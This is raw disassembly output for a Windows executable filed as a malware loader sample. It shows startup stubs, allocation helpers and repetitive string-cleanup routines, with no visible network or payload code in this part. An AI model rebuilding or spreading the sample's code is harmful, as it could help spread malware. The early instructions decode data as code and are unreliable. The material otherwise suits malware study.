
malware_samples/loader/404e0620233f6e194107894780ca37bb2792d6a21271563a896287735a2a23a1.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	00 20                	add    %ah,(%eax)
  401002:	78 17                	js     0x40101b
  401004:	40                   	inc    %eax
  401005:	00 00                	add    %al,(%eax)
  401007:	20 6c 55 40          	and    %ch,0x40(%ebp,%edx,2)
  40100b:	00 00                	add    %al,(%eax)
  40100d:	20 10                	and    %dl,(%eax)
  40100f:	65 40                	gs inc %eax
  401011:	00 00                	add    %al,(%eax)
  401013:	fe                   	(bad)
  401014:	b8 68 40 00 00       	mov    $0x4068,%eax
  401019:	20 08                	and    %cl,(%eax)
  40101b:	69 40 00 00 20 18 a4 	imul   $0xa4182000,0x0(%eax),%eax
  401022:	40                   	inc    %eax
  401023:	00 00                	add    %al,(%eax)
  401025:	20 8c b3 40 00 00 fe 	and    %cl,-0x1ffffc0(%ebx,%esi,4)
  40102c:	34 e6                	xor    $0xe6,%al
  40102e:	40                   	inc    %eax
  40102f:	00 00                	add    %al,(%eax)
  401031:	fe                   	(bad)
  401032:	64 e6 40             	fs out %al,$0x40
  401035:	00 00                	add    %al,(%eax)
  401037:	fe                   	(bad)
  401038:	94                   	xchg   %eax,%esp
  401039:	e6 40                	out    %al,$0x40
  40103b:	00 00                	add    %al,(%eax)
  40103d:	fe c4                	inc    %ah
  40103f:	e6 40                	out    %al,$0x40
  401041:	00 00                	add    %al,(%eax)
  401043:	fe                   	(bad)
  401044:	f4                   	hlt
  401045:	e6 40                	out    %al,$0x40
  401047:	00 00                	add    %al,(%eax)
  401049:	fe                   	(bad)
  40104a:	24 e7                	and    $0xe7,%al
  40104c:	40                   	inc    %eax
  40104d:	00 00                	add    %al,(%eax)
  40104f:	fe                   	(bad)
  401050:	54                   	push   %esp
  401051:	e7 40                	out    %eax,$0x40
  401053:	00 00                	add    %al,(%eax)
  401055:	fe 84 e7 40 00 00 20 	incb   0x20000040(%edi,%eiz,8)
  40105c:	c4 e7 40 00          	(bad)
  401060:	00 20                	add    %ah,(%eax)
  401062:	50                   	push   %eax
  401063:	eb 40                	jmp    0x4010a5
  401065:	00 00                	add    %al,(%eax)
  401067:	20 14 ec             	and    %dl,(%esp,%ebp,8)
  40106a:	40                   	inc    %eax
  40106b:	00 00                	add    %al,(%eax)
  40106d:	20 90 f2 40 00 00    	and    %dl,0x40f2(%eax)
  401073:	24 a0                	and    $0xa0,%al
  401075:	f9                   	stc
  401076:	40                   	inc    %eax
  401077:	00 00                	add    %al,(%eax)
  401079:	20 00                	and    %al,(%eax)
  40107b:	fa                   	cli
  40107c:	40                   	inc    %eax
  40107d:	00 00                	add    %al,(%eax)
  40107f:	00 58 11             	add    %bl,0x11(%eax)
  401082:	41                   	inc    %ecx
  401083:	00 00                	add    %al,(%eax)
  401085:	05 54 4e 41 00       	add    $0x414e54,%eax
  40108a:	00 04 c4             	add    %al,(%esp,%eax,8)
  40108d:	34 41                	xor    $0x41,%al
  40108f:	00 00                	add    %al,(%eax)
  401091:	04 4c                	add    $0x4c,%al
  401093:	80 41 00 00          	addb   $0x0,0x0(%ecx)
  401097:	0a f8                	or     %al,%bh
  401099:	ae                   	scas   %es:(%edi),%al
  40109a:	41                   	inc    %ecx
  40109b:	00 00                	add    %al,(%eax)
  40109d:	0a a0 b6 41 00 00    	or     0x41b6(%eax),%ah
  4010a3:	0a 7c b2 41          	or     0x41(%edx,%esi,4),%bh
  4010a7:	00 00                	add    %al,(%eax)
  4010a9:	0a ec                	or     %ah,%ch
  4010ab:	bc 41 00 00 0a       	mov    $0xa000041,%esp
  4010b0:	a8 ae                	test   $0xae,%al
  4010b2:	41                   	inc    %ecx
  4010b3:	00 00                	add    %al,(%eax)
  4010b5:	01 68 cb             	add    %ebp,-0x35(%eax)
  4010b8:	41                   	inc    %ecx
  4010b9:	00 00                	add    %al,(%eax)
  4010bb:	03 f8                	add    %eax,%edi
  4010bd:	d7                   	xlat   %ds:(%ebx)
  4010be:	41                   	inc    %ecx
  4010bf:	00 00                	add    %al,(%eax)
  4010c1:	02 8c e1 41 00 00 03 	add    0x3000041(%ecx,%eiz,8),%cl
  4010c8:	d0 e3                	shl    $1,%bl
  4010ca:	41                   	inc    %ecx
  4010cb:	00 00                	add    %al,(%eax)
  4010cd:	14 30                	adc    $0x30,%al
  4010cf:	ee                   	out    %al,(%dx)
  4010d0:	41                   	inc    %ecx
  4010d1:	00 00                	add    %al,(%eax)
  4010d3:	15 38 f0 41 00       	adc    $0x41f038,%eax
  4010d8:	00 01                	add    %al,(%ecx)
  4010da:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4010db:	f0 41                	lock inc %ecx
  4010dd:	00 00                	add    %al,(%eax)
  4010df:	01 c8                	add    %ecx,%eax
  4010e1:	ff 41 00             	incl   0x0(%ecx)
  4010e4:	00 20                	add    %ah,(%eax)
  4010e6:	48                   	dec    %eax
  4010e7:	01 42 00             	add    %eax,0x0(%edx)
  4010ea:	00 00                	add    %al,(%eax)
  4010ec:	3c 06                	cmp    $0x6,%al
  4010ee:	42                   	inc    %edx
  4010ef:	00 00                	add    %al,(%eax)
  4010f1:	20 98 11 42 00 00    	and    %bl,0x4211(%eax)
  4010f7:	20 38                	and    %bh,(%eax)
  4010f9:	17                   	pop    %ss
  4010fa:	42                   	inc    %edx
  4010fb:	00 00                	add    %al,(%eax)
  4010fd:	00 98 f7 40 00 00    	add    %bl,0x40f7(%eax)
  401103:	00 74 4f 41          	add    %dh,0x41(%edi,%ecx,2)
  401107:	00 00                	add    %al,(%eax)
  401109:	04 5c                	add    $0x5c,%al
  40110b:	80 41 00 00          	addb   $0x0,0x0(%ecx)
  40110f:	03 98 d9 41 00 00    	add    0x41d9(%eax),%ebx
  401115:	02 dc                	add    %ah,%bl
  401117:	e1 41                	loope  0x40115a
  401119:	00 00                	add    %al,(%eax)
  40111b:	03 f0                	add    %eax,%esi
  40111d:	e1 41                	loope  0x401160
  40111f:	00 f0                	add    %dh,%al
  401121:	d9 41 00             	flds   0x0(%ecx)
  401124:	f0 d9 41 00          	lock flds 0x0(%ecx)
  401128:	eb 10                	jmp    0x40113a
  40112a:	66 62 3a             	bound  %di,(%edx)
  40112d:	43                   	inc    %ebx
  40112e:	2b 2b                	sub    (%ebx),%ebp
  401130:	48                   	dec    %eax
  401131:	4f                   	dec    %edi
  401132:	4f                   	dec    %edi
  401133:	4b                   	dec    %ebx
  401134:	90                   	nop
  401135:	e9 b0 30 42 00       	jmp    0x8241ea
  40113a:	e8 05 c0 01 00       	call   0x41d144
  40113f:	a1 a3 30 42 00       	mov    0x4230a3,%eax
  401144:	c1 e0 02             	shl    $0x2,%eax
  401147:	a3 a7 30 42 00       	mov    %eax,0x4230a7
  40114c:	52                   	push   %edx
  40114d:	6a 00                	push   $0x0
  40114f:	e8 36 10 02 00       	call   0x42218a
  401154:	8b d0                	mov    %eax,%edx
  401156:	89 15 ab 30 42 00    	mov    %edx,0x4230ab
  40115c:	e8 33 0c 01 00       	call   0x411d94
  401161:	5a                   	pop    %edx
  401162:	e8 15 e8 00 00       	call   0x40f97c
  401167:	e8 2c 0c 01 00       	call   0x411d98
  40116c:	68 4c 30 42 00       	push   $0x42304c
  401171:	6a 00                	push   $0x0
  401173:	e8 12 10 02 00       	call   0x42218a
  401178:	a3 ab 30 42 00       	mov    %eax,0x4230ab
  40117d:	6a 00                	push   $0x0
  40117f:	e9 38 d7 01 00       	jmp    0x41e8bc
  401184:	33 c0                	xor    %eax,%eax
  401186:	a0 95 30 42 00       	mov    0x423095,%al
  40118b:	c3                   	ret
  40118c:	a1 ab 30 42 00       	mov    0x4230ab,%eax
  401191:	c3                   	ret
  401192:	60                   	pusha
  401193:	bb 00 50 b0 bc       	mov    $0xbcb05000,%ebx
  401198:	53                   	push   %ebx
  401199:	68 ad 0b 00 00       	push   $0xbad
  40119e:	c3                   	ret
  40119f:	b9 2c 03 00 00       	mov    $0x32c,%ecx
  4011a4:	0b c9                	or     %ecx,%ecx
  4011a6:	74 4d                	je     0x4011f5
  4011a8:	83 3d a3 30 42 00 00 	cmpl   $0x0,0x4230a3
  4011af:	73 0a                	jae    0x4011bb
  4011b1:	b8 fe 00 00 00       	mov    $0xfe,%eax
  4011b6:	e8 d7 ff ff ff       	call   0x401192
  4011bb:	b9 2c 03 00 00       	mov    $0x32c,%ecx
  4011c0:	51                   	push   %ecx
  4011c1:	6a 08                	push   $0x8
  4011c3:	e8 d4 0f 02 00       	call   0x42219c
  4011c8:	50                   	push   %eax
  4011c9:	e8 1c 10 02 00       	call   0x4221ea
  4011ce:	0b c0                	or     %eax,%eax
  4011d0:	75 0a                	jne    0x4011dc
  4011d2:	b8 fd 00 00 00       	mov    $0xfd,%eax
  4011d7:	e8 b6 ff ff ff       	call   0x401192
  4011dc:	50                   	push   %eax
  4011dd:	50                   	push   %eax
  4011de:	ff 35 a3 30 42 00    	push   0x4230a3
  4011e4:	e8 93 d8 01 00       	call   0x41ea7c
  4011e9:	ff 35 a3 30 42 00    	push   0x4230a3
  4011ef:	e8 98 d8 01 00       	call   0x41ea8c
  4011f4:	5f                   	pop    %edi
  4011f5:	c3                   	ret
  4011f6:	b9 2c 03 00 00       	mov    $0x32c,%ecx
  4011fb:	0b c9                	or     %ecx,%ecx
  4011fd:	74 19                	je     0x401218
  4011ff:	e8 48 d8 01 00       	call   0x41ea4c
  401204:	a3 a3 30 42 00       	mov    %eax,0x4230a3
  401209:	83 f8 00             	cmp    $0x0,%eax
  40120c:	73 91                	jae    0x40119f
  40120e:	b8 fc 00 00 00       	mov    $0xfc,%eax
  401213:	e8 7a ff ff ff       	call   0x401192
  401218:	c3                   	ret
  401219:	83 3d a3 30 42 00 00 	cmpl   $0x0,0x4230a3
  401220:	72 28                	jb     0x40124a
  401222:	ff 35 a3 30 42 00    	push   0x4230a3
  401228:	e8 3f d8 01 00       	call   0x41ea6c
  40122d:	0b c0                	or     %eax,%eax
  40122f:	74 19                	je     0x40124a
  401231:	50                   	push   %eax
  401232:	6a 08                	push   $0x8
  401234:	e8 63 0f 02 00       	call   0x42219c
  401239:	50                   	push   %eax
  40123a:	e8 b1 0f 02 00       	call   0x4221f0
  40123f:	ff 35 a3 30 42 00    	push   0x4230a3
  401245:	e8 52 d8 01 00       	call   0x41ea9c
  40124a:	c3                   	ret
  40124b:	c3                   	ret
  40124c:	83 3d a3 30 42 00 00 	cmpl   $0x0,0x4230a3
  401253:	74 10                	je     0x401265
  401255:	e8 bf ff ff ff       	call   0x401219
  40125a:	ff 35 a3 30 42 00    	push   0x4230a3
  401260:	e8 f7 d7 01 00       	call   0x41ea5c
  401265:	c3                   	ret
  401266:	a1 a3 30 42 00       	mov    0x4230a3,%eax
  40126b:	64 67 8b 16 2c 00    	mov    %fs:0x2c,%edx
  401271:	8b 04 82             	mov    (%edx,%eax,4),%eax
  401274:	c3                   	ret
  401275:	90                   	nop
  401276:	90                   	nop
  401277:	90                   	nop
  401278:	83 ec 0c             	sub    $0xc,%esp
  40127b:	c7 04 24 5c d9 4a 00 	movl   $0x4ad95c,(%esp)
  401282:	e8 85 5d 00 00       	call   0x40700c
  401287:	83 c4 0c             	add    $0xc,%esp
  40128a:	c3                   	ret
  40128b:	66 66 66 66 2e 0f 1f 	data16 data16 data16 nopw %cs:0x0(%eax,%eax,1)
  401292:	84 00 00 00 00 00 
  401298:	83 ec 0c             	sub    $0xc,%esp
  40129b:	c7 04 24 5d d9 4a 00 	movl   $0x4ad95d,(%esp)
  4012a2:	e8 41 a8 00 00       	call   0x40bae8
  4012a7:	83 c4 0c             	add    $0xc,%esp
  4012aa:	c3                   	ret
  4012ab:	66 66 66 66 2e 0f 1f 	data16 data16 data16 nopw %cs:0x0(%eax,%eax,1)
  4012b2:	84 00 00 00 00 00 
  4012b8:	83 ec 0c             	sub    $0xc,%esp
  4012bb:	8b 0d 04 ed 4a 00    	mov    0x4aed04,%ecx
  4012c1:	83 f9 10             	cmp    $0x10,%ecx
  4012c4:	72 19                	jb     0x4012df
  4012c6:	a1 f0 ec 4a 00       	mov    0x4aecf0,%eax
  4012cb:	41                   	inc    %ecx
  4012cc:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4012d2:	72 03                	jb     0x4012d7
  4012d4:	8b 40 fc             	mov    -0x4(%eax),%eax
  4012d7:	89 04 24             	mov    %eax,(%esp)
  4012da:	e8 4d 51 00 00       	call   0x40642c
  4012df:	c7 05 04 ed 4a 00 0f 	movl   $0xf,0x4aed04
  4012e6:	00 00 00 
  4012e9:	c7 05 00 ed 4a 00 00 	movl   $0x0,0x4aed00
  4012f0:	00 00 00 
  4012f3:	c6 05 f0 ec 4a 00 00 	movb   $0x0,0x4aecf0
  4012fa:	83 c4 0c             	add    $0xc,%esp
  4012fd:	c3                   	ret
  4012fe:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  401305:	00 00 00 
  401308:	83 ec 0c             	sub    $0xc,%esp
  40130b:	8b 0d 24 ed 4a 00    	mov    0x4aed24,%ecx
  401311:	83 f9 10             	cmp    $0x10,%ecx
  401314:	72 19                	jb     0x40132f
  401316:	a1 10 ed 4a 00       	mov    0x4aed10,%eax
  40131b:	41                   	inc    %ecx
  40131c:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  401322:	72 03                	jb     0x401327
  401324:	8b 40 fc             	mov    -0x4(%eax),%eax
  401327:	89 04 24             	mov    %eax,(%esp)
  40132a:	e8 fd 50 00 00       	call   0x40642c
  40132f:	c7 05 24 ed 4a 00 0f 	movl   $0xf,0x4aed24
  401336:	00 00 00 
  401339:	c7 05 20 ed 4a 00 00 	movl   $0x0,0x4aed20
  401340:	00 00 00 
  401343:	c6 05 10 ed 4a 00 00 	movb   $0x0,0x4aed10
  40134a:	83 c4 0c             	add    $0xc,%esp
  40134d:	c3                   	ret
  40134e:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  401355:	00 00 00 
  401358:	83 ec 0c             	sub    $0xc,%esp
  40135b:	8b 0d 44 ed 4a 00    	mov    0x4aed44,%ecx
  401361:	83 f9 10             	cmp    $0x10,%ecx
  401364:	72 19                	jb     0x40137f
  401366:	a1 30 ed 4a 00       	mov    0x4aed30,%eax
  40136b:	41                   	inc    %ecx
  40136c:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  401372:	72 03                	jb     0x401377
  401374:	8b 40 fc             	mov    -0x4(%eax),%eax
  401377:	89 04 24             	mov    %eax,(%esp)
  40137a:	e8 ad 50 00 00       	call   0x40642c
  40137f:	c7 05 44 ed 4a 00 0f 	movl   $0xf,0x4aed44
  401386:	00 00 00 
  401389:	c7 05 40 ed 4a 00 00 	movl   $0x0,0x4aed40
  401390:	00 00 00 
  401393:	c6 05 30 ed 4a 00 00 	movb   $0x0,0x4aed30
  40139a:	83 c4 0c             	add    $0xc,%esp
  40139d:	c3                   	ret
  40139e:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  4013a5:	00 00 00 
  4013a8:	83 ec 0c             	sub    $0xc,%esp
  4013ab:	8b 0d 64 ed 4a 00    	mov    0x4aed64,%ecx
  4013b1:	83 f9 10             	cmp    $0x10,%ecx
  4013b4:	72 19                	jb     0x4013cf
  4013b6:	a1 50 ed 4a 00       	mov    0x4aed50,%eax
  4013bb:	41                   	inc    %ecx
  4013bc:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4013c2:	72 03                	jb     0x4013c7
  4013c4:	8b 40 fc             	mov    -0x4(%eax),%eax
  4013c7:	89 04 24             	mov    %eax,(%esp)
  4013ca:	e8 5d 50 00 00       	call   0x40642c
  4013cf:	c7 05 64 ed 4a 00 0f 	movl   $0xf,0x4aed64
  4013d6:	00 00 00 
  4013d9:	c7 05 60 ed 4a 00 00 	movl   $0x0,0x4aed60
  4013e0:	00 00 00 
  4013e3:	c6 05 50 ed 4a 00 00 	movb   $0x0,0x4aed50
  4013ea:	83 c4 0c             	add    $0xc,%esp
  4013ed:	c3                   	ret
  4013ee:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  4013f5:	00 00 00 
  4013f8:	83 ec 0c             	sub    $0xc,%esp
  4013fb:	8b 0d 84 ed 4a 00    	mov    0x4aed84,%ecx
  401401:	83 f9 10             	cmp    $0x10,%ecx
  401404:	72 19                	jb     0x40141f
  401406:	a1 70 ed 4a 00       	mov    0x4aed70,%eax
  40140b:	41                   	inc    %ecx
  40140c:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  401412:	72 03                	jb     0x401417
  401414:	8b 40 fc             	mov    -0x4(%eax),%eax
  401417:	89 04 24             	mov    %eax,(%esp)
  40141a:	e8 0d 50 00 00       	call   0x40642c
  40141f:	c7 05 84 ed 4a 00 0f 	movl   $0xf,0x4aed84
  401426:	00 00 00 
  401429:	c7 05 80 ed 4a 00 00 	movl   $0x0,0x4aed80
  401430:	00 00 00 
  401433:	c6 05 70 ed 4a 00 00 	movb   $0x0,0x4aed70
  40143a:	83 c4 0c             	add    $0xc,%esp
  40143d:	c3                   	ret
  40143e:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  401445:	00 00 00 
  401448:	83 ec 0c             	sub    $0xc,%esp
  40144b:	8b 0d a4 ed 4a 00    	mov    0x4aeda4,%ecx
  401451:	83 f9 10             	cmp    $0x10,%ecx
  401454:	72 19                	jb     0x40146f
  401456:	a1 90 ed 4a 00       	mov    0x4aed90,%eax
  40145b:	41                   	inc    %ecx
  40145c:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  401462:	72 03                	jb     0x401467
  401464:	8b 40 fc             	mov    -0x4(%eax),%eax
  401467:	89 04 24             	mov    %eax,(%esp)
  40146a:	e8 bd 4f 00 00       	call   0x40642c
  40146f:	c7 05 a4 ed 4a 00 0f 	movl   $0xf,0x4aeda4
  401476:	00 00 00 
  401479:	c7 05 a0 ed 4a 00 00 	movl   $0x0,0x4aeda0
  401480:	00 00 00 
  401483:	c6 05 90 ed 4a 00 00 	movb   $0x0,0x4aed90
  40148a:	83 c4 0c             	add    $0xc,%esp
  40148d:	c3                   	ret
  40148e:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  401495:	00 00 00 
  401498:	83 ec 0c             	sub    $0xc,%esp
  40149b:	8b 0d c4 ed 4a 00    	mov    0x4aedc4,%ecx
  4014a1:	83 f9 10             	cmp    $0x10,%ecx
  4014a4:	72 19                	jb     0x4014bf
  4014a6:	a1 b0 ed 4a 00       	mov    0x4aedb0,%eax
  4014ab:	41                   	inc    %ecx
  4014ac:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4014b2:	72 03                	jb     0x4014b7
  4014b4:	8b 40 fc             	mov    -0x4(%eax),%eax
  4014b7:	89 04 24             	mov    %eax,(%esp)
  4014ba:	e8 6d 4f 00 00       	call   0x40642c
  4014bf:	c7 05 c4 ed 4a 00 0f 	movl   $0xf,0x4aedc4
  4014c6:	00 00 00 
  4014c9:	c7 05 c0 ed 4a 00 00 	movl   $0x0,0x4aedc0
  4014d0:	00 00 00 
  4014d3:	c6 05 b0 ed 4a 00 00 	movb   $0x0,0x4aedb0
  4014da:	83 c4 0c             	add    $0xc,%esp
  4014dd:	c3                   	ret
  4014de:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  4014e5:	00 00 00 
  4014e8:	83 ec 0c             	sub    $0xc,%esp
  4014eb:	8b 0d e4 ed 4a 00    	mov    0x4aede4,%ecx
  4014f1:	83 f9 10             	cmp    $0x10,%ecx
  4014f4:	72 19                	jb     0x40150f
  4014f6:	a1 d0 ed 4a 00       	mov    0x4aedd0,%eax
  4014fb:	41                   	inc    %ecx
  4014fc:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  401502:	72 03                	jb     0x401507
  401504:	8b 40 fc             	mov    -0x4(%eax),%eax
  401507:	89 04 24             	mov    %eax,(%esp)
  40150a:	e8 1d 4f 00 00       	call   0x40642c
  40150f:	c7 05 e4 ed 4a 00 0f 	movl   $0xf,0x4aede4
  401516:	00 00 00 
  401519:	c7 05 e0 ed 4a 00 00 	movl   $0x0,0x4aede0
  401520:	00 00 00 
  401523:	c6 05 d0 ed 4a 00 00 	movb   $0x0,0x4aedd0
  40152a:	83 c4 0c             	add    $0xc,%esp
  40152d:	c3                   	ret
  40152e:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  401535:	00 00 00 
  401538:	83 ec 0c             	sub    $0xc,%esp
  40153b:	8b 0d 04 ee 4a 00    	mov    0x4aee04,%ecx
  401541:	83 f9 10             	cmp    $0x10,%ecx
  401544:	72 19                	jb     0x40155f
  401546:	a1 f0 ed 4a 00       	mov    0x4aedf0,%eax
  40154b:	41                   	inc    %ecx
  40154c:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  401552:	72 03                	jb     0x401557
  401554:	8b 40 fc             	mov    -0x4(%eax),%eax
  401557:	89 04 24             	mov    %eax,(%esp)
  40155a:	e8 cd 4e 00 00       	call   0x40642c
  40155f:	c7 05 04 ee 4a 00 0f 	movl   $0xf,0x4aee04
  401566:	00 00 00 
  401569:	c7 05 00 ee 4a 00 00 	movl   $0x0,0x4aee00
  401570:	00 00 00 
  401573:	c6 05 f0 ed 4a 00 00 	movb   $0x0,0x4aedf0
  40157a:	83 c4 0c             	add    $0xc,%esp
  40157d:	c3                   	ret
  40157e:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  401585:	00 00 00 
  401588:	83 ec 0c             	sub    $0xc,%esp
  40158b:	8b 0d 24 ee 4a 00    	mov    0x4aee24,%ecx
  401591:	83 f9 10             	cmp    $0x10,%ecx
  401594:	72 19                	jb     0x4015af
  401596:	a1 10 ee 4a 00       	mov    0x4aee10,%eax
  40159b:	41                   	inc    %ecx
  40159c:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4015a2:	72 03                	jb     0x4015a7
  4015a4:	8b 40 fc             	mov    -0x4(%eax),%eax
  4015a7:	89 04 24             	mov    %eax,(%esp)
  4015aa:	e8 7d 4e 00 00       	call   0x40642c
  4015af:	c7 05 24 ee 4a 00 0f 	movl   $0xf,0x4aee24
  4015b6:	00 00 00 
  4015b9:	c7 05 20 ee 4a 00 00 	movl   $0x0,0x4aee20
  4015c0:	00 00 00 
  4015c3:	c6 05 10 ee 4a 00 00 	movb   $0x0,0x4aee10
  4015ca:	83 c4 0c             	add    $0xc,%esp
  4015cd:	c3                   	ret
  4015ce:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  4015d5:	00 00 00 
  4015d8:	83 ec 0c             	sub    $0xc,%esp
  4015db:	8b 0d 44 ee 4a 00    	mov    0x4aee44,%ecx
  4015e1:	83 f9 10             	cmp    $0x10,%ecx
  4015e4:	72 19                	jb     0x4015ff
  4015e6:	a1 30 ee 4a 00       	mov    0x4aee30,%eax
  4015eb:	41                   	inc    %ecx
  4015ec:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4015f2:	72 03                	jb     0x4015f7
  4015f4:	8b 40 fc             	mov    -0x4(%eax),%eax
  4015f7:	89 04 24             	mov    %eax,(%esp)
  4015fa:	e8 2d 4e 00 00       	call   0x40642c
  4015ff:	c7 05 44 ee 4a 00 0f 	movl   $0xf,0x4aee44
  401606:	00 00 00 
  401609:	c7 05 40 ee 4a 00 00 	movl   $0x0,0x4aee40
  401610:	00 00 00 
  401613:	c6 05 30 ee 4a 00 00 	movb   $0x0,0x4aee30
  40161a:	83 c4 0c             	add    $0xc,%esp
  40161d:	c3                   	ret
  40161e:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  401625:	00 00 00 
  401628:	83 ec 0c             	sub    $0xc,%esp
  40162b:	8b 0d 64 ee 4a 00    	mov    0x4aee64,%ecx
  401631:	83 f9 10             	cmp    $0x10,%ecx
  401634:	72 19                	jb     0x40164f
  401636:	a1 50 ee 4a 00       	mov    0x4aee50,%eax
  40163b:	41                   	inc    %ecx
  40163c:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  401642:	72 03                	jb     0x401647
  401644:	8b 40 fc             	mov    -0x4(%eax),%eax
  401647:	89 04 24             	mov    %eax,(%esp)
  40164a:	e8 dd 4d 00 00       	call   0x40642c
  40164f:	c7 05 64 ee 4a 00 0f 	movl   $0xf,0x4aee64
  401656:	00 00 00 
  401659:	c7 05 60 ee 4a 00 00 	movl   $0x0,0x4aee60
  401660:	00 00 00 
  401663:	c6 05 50 ee 4a 00 00 	movb   $0x0,0x4aee50
  40166a:	83 c4 0c             	add    $0xc,%esp
  40166d:	c3                   	ret
  40166e:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  401675:	00 00 00 
  401678:	83 ec 0c             	sub    $0xc,%esp
  40167b:	8b 0d 90 ee 4a 00    	mov    0x4aee90,%ecx
  401681:	83 f9 10             	cmp    $0x10,%ecx
  401684:	72 19                	jb     0x40169f
  401686:	a1 7c ee 4a 00       	mov    0x4aee7c,%eax
  40168b:	41                   	inc    %ecx
  40168c:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  401692:	72 03                	jb     0x401697
  401694:	8b 40 fc             	mov    -0x4(%eax),%eax
  401697:	89 04 24             	mov    %eax,(%esp)
  40169a:	e8 8d 4d 00 00       	call   0x40642c
  40169f:	c7 05 90 ee 4a 00 0f 	movl   $0xf,0x4aee90
  4016a6:	00 00 00 
  4016a9:	c7 05 8c ee 4a 00 00 	movl   $0x0,0x4aee8c
  4016b0:	00 00 00 
  4016b3:	c6 05 7c ee 4a 00 00 	movb   $0x0,0x4aee7c
  4016ba:	83 c4 0c             	add    $0xc,%esp
  4016bd:	c3                   	ret
  4016be:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  4016c5:	00 00 00 
  4016c8:	83 ec 0c             	sub    $0xc,%esp
  4016cb:	8b 0d b0 ee 4a 00    	mov    0x4aeeb0,%ecx
  4016d1:	83 f9 10             	cmp    $0x10,%ecx
  4016d4:	72 19                	jb     0x4016ef
  4016d6:	a1 9c ee 4a 00       	mov    0x4aee9c,%eax
  4016db:	41                   	inc    %ecx
  4016dc:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4016e2:	72 03                	jb     0x4016e7
  4016e4:	8b 40 fc             	mov    -0x4(%eax),%eax
  4016e7:	89 04 24             	mov    %eax,(%esp)
  4016ea:	e8 3d 4d 00 00       	call   0x40642c
  4016ef:	c7 05 b0 ee 4a 00 0f 	movl   $0xf,0x4aeeb0
  4016f6:	00 00 00 
  4016f9:	c7 05 ac ee 4a 00 00 	movl   $0x0,0x4aeeac
  401700:	00 00 00 
  401703:	c6 05 9c ee 4a 00 00 	movb   $0x0,0x4aee9c
  40170a:	83 c4 0c             	add    $0xc,%esp
  40170d:	c3                   	ret
  40170e:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  401715:	00 00 00 
  401718:	83 ec 0c             	sub    $0xc,%esp
  40171b:	8b 0d d0 ee 4a 00    	mov    0x4aeed0,%ecx
  401721:	83 f9 10             	cmp    $0x10,%ecx
  401724:	72 19                	jb     0x40173f
  401726:	a1 bc ee 4a 00       	mov    0x4aeebc,%eax
  40172b:	41                   	inc    %ecx
  40172c:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  401732:	72 03                	jb     0x401737
  401734:	8b 40 fc             	mov    -0x4(%eax),%eax
  401737:	89 04 24             	mov    %eax,(%esp)
  40173a:	e8 ed 4c 00 00       	call   0x40642c
  40173f:	c7 05 d0 ee 4a 00 0f 	movl   $0xf,0x4aeed0
  401746:	00 00 00 
  401749:	c7 05 cc ee 4a 00 00 	movl   $0x0,0x4aeecc
  401750:	00 00 00 
  401753:	c6 05 bc ee 4a 00 00 	movb   $0x0,0x4aeebc
  40175a:	83 c4 0c             	add    $0xc,%esp
  40175d:	c3                   	ret
  40175e:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  401765:	00 00 00 
  401768:	c3                   	ret
  401769:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 nopw %cs:0x0(%eax,%eax,1)
  401770:	0f 1f 84 00 00 00 00 
  401777:	00 
  401778:	55                   	push   %ebp
  401779:	89 e5                	mov    %esp,%ebp
  40177b:	53                   	push   %ebx
  40177c:	57                   	push   %edi
  40177d:	56                   	push   %esi
  40177e:	81 ec bc 00 00 00    	sub    $0xbc,%esp
  401784:	8a 1d e0 ee 4a 00    	mov    0x4aeee0,%bl
  40178a:	c7 85 7c ff ff ff 98 	movl   $0x421398,-0x84(%ebp)
  401791:	13 42 00 
  401794:	c7 45 80 80 37 42 00 	movl   $0x423780,-0x80(%ebp)
  40179b:	89 6d 84             	mov    %ebp,-0x7c(%ebp)
  40179e:	89 65 8c             	mov    %esp,-0x74(%ebp)
  4017a1:	c7 45 84 e7 1a 40 00 	movl   $0x401ae7,-0x7c(%ebp)
  4017a8:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  4017ae:	e8 4e 08 02 00       	call   0x422001
  4017b3:	80 fb 00             	cmp    $0x0,%bl
  4017b6:	75 2a                	jne    0x4017e2
  4017b8:	c7 05 d8 ee 4a 00 48 	movl   $0x405548,0x4aeed8
  4017bf:	55 40 00 
  4017c2:	c7 04 24 68 17 40 00 	movl   $0x401768,(%esp)
  4017c9:	e8 92 bd 01 00       	call   0x41d560
  4017ce:	c7 05 e4 ee 4a 00 00 	movl   $0x0,0x4aeee4
  4017d5:	00 00 00 
